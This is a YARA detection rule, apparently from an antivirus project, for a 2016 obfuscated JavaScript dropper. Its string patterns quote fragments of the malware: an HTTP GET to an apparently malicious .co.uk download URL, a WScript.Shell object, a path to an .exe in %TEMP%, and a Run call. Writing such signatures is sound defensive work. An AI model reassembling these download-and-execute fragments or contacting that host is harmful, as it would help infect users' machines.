rule sig_20160330_a778edfe5f3a514e6d5b1591ee8de4ea {
  meta:
    description = "datamaliciousorder - file 20160330_a778edfe5f3a514e6d5b1591ee8de4ea.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "d180045568472afda8ef0026641e56a3f27ed1d90f265fee6100bfe4832ae2ca"

  strings:
    $s1  = "_R0[_J](\"GET\", \"http://srijanexportstowelwarmers.co.uk/k9owpa\", false);" fullword ascii
    $s2  = "var _B = function _LV() {return WScript[_NA](\"WScript\"+\".Shell\");}(), _YY = 11;" fullword ascii
    $s3  = "function _UJ(_S1, _NB){_BV = _BV * 1; return _S1 - _NB;};" fullword ascii
    $s4  = "if (_R0[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _ZE() {return _B[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"ixqmJDYrU0zd.ex\" + \"e\";};" fullword ascii
    $s6  = "function _UC(){return _AZ + \"\";};" fullword ascii
    $s7  = "function _M() {return ((_DP == true) && (_DP == _OF)) ? 1 : _BV;};" fullword ascii
    $s8  = "function _K(_BW){_B[\"Run\"](_BW, _BV, _BV);};" fullword ascii
    $s9  = "function _M2(){return 22;};" fullword ascii
    $s10 = "var _BX = new this[\"Date\"]();" fullword ascii
    $s11 = "function _M0(_PV) {var _SR = (1, 2, 3, 4, 5, _PV); return _SR;};" fullword ascii
    $s12 = "function _M1()" fullword ascii
    $s13 = " while (_MZ){" fullword ascii
    $s14 = "return _UJ(_FJ, _S0);" fullword ascii
    $s15 = "function _RY(){return _NA;};" fullword ascii
    $s16 = "var _R = false;" fullword ascii
    $s17 = "_DP = true; " fullword ascii
    $s18 = "var _DP = false;" fullword ascii
    $s19 = "var _OF = false;" fullword ascii
    $s20 = "_OF = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}